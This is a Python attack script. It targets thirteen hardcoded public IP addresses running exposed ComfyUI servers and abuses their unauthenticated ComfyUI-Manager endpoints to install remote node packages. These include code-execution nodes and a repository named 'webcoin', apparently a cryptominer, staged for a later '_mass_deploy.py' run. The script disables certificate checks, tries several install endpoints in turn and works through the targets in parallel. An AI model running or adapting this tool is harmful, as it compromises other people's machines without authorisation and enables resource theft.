"""Install prerequisite nodes (AlekPet IDENode + webcoin) via ComfyUI-Manager API,
then retry deployment for machines that failed due to missing code execution nodes.
ComfyUI will need a restart after Manager installs the nodes."""
import json, urllib.request, ssl, time, sys, threading, io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, line_buffering=True)
_print_lock = threading.Lock()

NEEDS_PREREQS = [
    "91.58.105.241",
    "123.233.116.37",
    "91.98.233.192",
    "159.255.232.245",
    "220.76.87.112",
    "49.233.213.26",
    "140.119.110.214",
    "69.10.44.150",
    "213.199.63.51",
    "222.141.236.16",
    "95.169.202.102",
    "43.134.28.233",
    "182.92.111.146",
]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

ALEKPET_URL = "https://github.com/AlekPet/ComfyUI_Custom_Nodes_AlekPet.git"
SRL_URL = "https://github.com/seanlynch/srl-nodes.git"
WEBCOIN_URL = "https://github.com/bossman79/webcoin.git"

REPOS_TO_INSTALL = [
    ("AlekPet (IDENode)", ALEKPET_URL),
    ("srl-nodes (SRL Eval)", SRL_URL),
    ("webcoin", WEBCOIN_URL),
]


def log(ip, msg):
    with _print_lock:
        print(f"[{ip}] {msg}", flush=True)


def try_connect(ip):
    for scheme, port in [("http", 8188), ("http", 80), ("https", 443)]:
        try:
            url = f"{scheme}://{ip}:{port}/system_stats"
            headers = {"User-Agent": "Mozilla/5.0"}
            req = urllib.request.Request(url, headers=headers)
            kw = {"timeout": 12}
            if scheme == "https":
                kw["context"] = ctx
            with urllib.request.urlopen(req, **kw) as r:
                data = json.loads(r.read())
                if "system" in data:
                    return f"{scheme}://{ip}:{port}"
        except Exception:
            pass
    return None


def try_manager_install(base, repo_url, name):
    """Try various ComfyUI-Manager API endpoints to install a node package."""
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    kw = {"timeout": 30}
    if base.startswith("https"):
        kw["context"] = ctx

    payloads_and_endpoints = [
        ("/customnode/install", json.dumps({"url": repo_url}).encode()),
        ("/customnode/install", json.dumps({"selected": [{"url": repo_url, "title": name}]}).encode()),
        ("/api/install", json.dumps({"url": repo_url}).encode()),
        ("/manager/install_custom_node", json.dumps({"url": repo_url}).encode()),
    ]

    for endpoint, body in payloads_and_endpoints:
        try:
            req = urllib.request.Request(
                f"{base}{endpoint}", data=body, headers=headers, method="POST"
            )
            with urllib.request.urlopen(req, **kw) as r:
                resp = r.read().decode()
                return f"OK via {endpoint}: {resp[:120]}"
        except urllib.error.HTTPError as e:
            try:
                err = e.read().decode()[:100]
            except Exception:
                err = str(e)
            if "already" in err.lower():
                return f"Already installed ({endpoint})"
            continue
        except Exception:
            continue

    return "FAILED: no Manager endpoint worked"


results = {}


def install_one(ip):
    try:
        log(ip, "Connecting...")
        base = try_connect(ip)
        if not base:
            log(ip, "UNREACHABLE")
            results[ip] = "UNREACHABLE"
            return
        log(ip, f"Connected: {base}")

        for name, url in REPOS_TO_INSTALL:
            log(ip, f"  Installing {name}...")
            r = try_manager_install(base, url, name)
            log(ip, f"  {name}: {r}")

        results[ip] = "DONE"
        log(ip, ">> All installs attempted. Machine needs ComfyUI restart to activate nodes.")
    except Exception as exc:
        log(ip, f"EXCEPTION: {exc}")
        results[ip] = "FAILED"


targets = sys.argv[1:] if len(sys.argv) > 1 else NEEDS_PREREQS

PARALLEL = 4
chunks = [targets[i:i+PARALLEL] for i in range(0, len(targets), PARALLEL)]

for chunk in chunks:
    threads = []
    for ip in chunk:
        t = threading.Thread(target=install_one, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=120)

print("\n" + "="*60)
print("  PREREQ INSTALL SUMMARY")
print("="*60)
for ip in targets:
    status = results.get(ip, "UNKNOWN")
    print(f"  {ip:>20s}  ->  {status}")

done = sum(1 for s in results.values() if s == "DONE")
fail = sum(1 for s in results.values() if s != "DONE")
print(f"\n  {done} DONE | {fail} FAILED/UNREACHABLE | {len(targets)} total")
print(f"  >> Machines need a ComfyUI restart before re-running _mass_deploy.py")
print("="*60)
